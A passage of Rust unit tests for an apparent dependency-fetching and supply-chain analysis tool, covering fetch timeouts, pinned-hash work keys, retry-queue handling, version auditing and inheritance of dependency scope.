            algo: filefacts::HashAlgo::Sha512,
            value: "PIN".into(),
        });
        let mut pass = session(
            &supplied,
            FetchPolicy {
                deps: true,
                ..FetchPolicy::default()
            },
            Some(store.clone()),
        );
        pass.deadline.at = Some(Instant::now());
        pass.run(&mut supplied, vec![("source".into(), vec![r.clone()])]);
        assert!(
            pass.out.records[0]
                .coverage_note
                .as_deref()
                .unwrap()
                .contains("fetch timeout")
        );
        assert_eq!(store.entries("source").unwrap()[0].reference, r);
    }
    #[test]
    fn conflicting_pins_have_distinct_fetch_work_keys() {
        let mut first = reference();
        first.pinned_hash = Some(filefacts::PinnedHash {
            algo: filefacts::HashAlgo::Sha512,
            value: "ONE".into(),
        });
        let mut second = first.clone();
        second.pinned_hash.as_mut().unwrap().value = "TWO".into();
        assert_ne!(fetch_work_key(&first), fetch_work_key(&second));
    }
}

#[cfg(test)]
mod retry_backlog_tests {
    use super::*;
    #[test]
    fn budget_transient_and_partial_work_remain_pending_but_permanent_refusals_do_not() {
        static RESOURCES: OnceLock<Resources> = OnceLock::new();
        let resources = RESOURCES.get_or_init(|| Resources {
            net: HttpFetch::new().unwrap(),
            cache: BlobCache::with_dir("/tmp/atomscan-backlog-test-cache"),
        });
        for (outcome, expected) in [
            (Outcome::BudgetExceeded, true),
            (Outcome::Failed(FetchError::Timeout), true),
            (Outcome::Failed(FetchError::Transport("DNS".into())), true),
            (Outcome::Failed(FetchError::Status(503)), true),
            (
                Outcome::Failed(FetchError::Refused("private".into())),
                false,
            ),
            (Outcome::Failed(FetchError::Status(404)), false),
        ] {
            let dir = tempfile::tempdir().unwrap();
            let store = Arc::new(pending::Store::open(&dir.path().join("queue")).unwrap());
            let mut report: AnalysisReport = serde_json::from_value(serde_json::json!({"version":"3","files":[{"id":0,"path":"sample","file_type":"javascript","sha256":"root","size":1,"depth":0}]})).unwrap();
            let r = Reference::new(
                RefLocator::Purl("pkg:npm/pkg@1.0.0".into()),
                RefKind::Dependency,
                "lock",
                "pkg",
            );
            let entry = pending::Entry {
                root_sha: "root".into(),
                source_sha: "source".into(),
                hop: 2,
                reference: r.clone(),
                reason: "in progress".into(),
                redirect_credit: 0,
            };
            store.update(&[entry], &[]).unwrap();
            let mut session = FetchSession::new(
                &report,
                &[],
                FetchPolicy {
                    deps: true,
                    ..FetchPolicy::default()
                },
                resources,
                Reporter::Off,
                false,
                &[],
            );
            session.pending = Some(store.clone());
            session.current_hop = 2;
            let mut record = FetchRecord::terminal("pkg:npm/pkg@1.0.0".into(), outcome);
            record.source_sha256 = Some("source".into());
            session.merge_group(
                &mut report,
                GroupFetch {
                    source_sha: "source".into(),
                    registries: vec![],
                    landed: vec![Landed {
                        reference: r,
                        record,
                        standing: Standing::Analyze,
                    }],
                },
                GroupAnalysis {
                    registries: vec![],
                    payloads: vec![None],
                },
                &mut vec![],
            );
            assert_eq!(!store.entries("root").unwrap().is_empty(), expected);
        }
    }
    #[test]
    fn all_versions_audit_keeps_an_older_pinned_release() {
        static RESOURCES: OnceLock<Resources> = OnceLock::new();
        let resources = RESOURCES.get_or_init(|| Resources {
            net: HttpFetch::new().unwrap(),
            cache: BlobCache::with_dir("/tmp/atomscan-versions-test-cache"),
        });
        let report: AnalysisReport =
            serde_json::from_value(serde_json::json!({"version":"3","files":[]})).unwrap();
        let r = Reference::new(
            RefLocator::Purl("pkg:npm/pkg@1.0.0".into()),
            RefKind::Dependency,
            "lock",
            "pkg",
        );
        let mut session = FetchSession::new(
            &report,
            &[],
            FetchPolicy {
                deps: true,
                ..FetchPolicy::default()
            },
            resources,
            Reporter::Off,
            false,
            &[],
        );
        session.newest.insert("pkg:npm/pkg".into(), "2.0.0".into());
        let mut skipped = 0;
        assert!(!session.newest_version(&r, &mut skipped));
        assert_eq!(skipped, 1);
        session.policy.all_versions = true;
        assert!(session.newest_version(&r, &mut skipped));
        assert_eq!(skipped, 1);
    }
}

#[cfg(test)]
mod scope_inheritance_tests {
    use super::*;
    #[test]
    fn dependency_context_follows_build_dev_and_ci_edges_without_losing_hooks() {
        for scope in [
            filefacts::DependencyScope::Build,
            filefacts::DependencyScope::Development,
            filefacts::DependencyScope::Ci,
        ] {
            let mut parent = Reference::new(
                RefLocator::Purl("pkg:npm/parent".into()),
                RefKind::Dependency,
                "lock",
                "parent",
            );
            parent.context = Some(filefacts::DependencyContext {
                scope,
                optional: true,
                has_install_script: false,
                installed_path: None,
            });
            let mut child = Reference::new(
                RefLocator::Purl("pkg:npm/child".into()),
                RefKind::Dependency,
                "lock",
                "child",
            );
            child.context = Some(filefacts::DependencyContext {
                scope: filefacts::DependencyScope::Runtime,
                optional: false,
                has_install_script: true,
                installed_path: Some("node_modules/child".into()),
            });
            let mut groups = vec![("source".into(), vec![child])];
            inherit_dependency_context(&parent, &mut groups);
            let context = groups[0].1[0].context.as_ref().unwrap();
            assert_eq!(context.scope, scope);
            assert!(context.optional);
            assert!(context.has_install_script);
            assert_eq!(
                context.installed_path.as_deref(),
                Some("node_modules/child")
            );
        }
    }
}
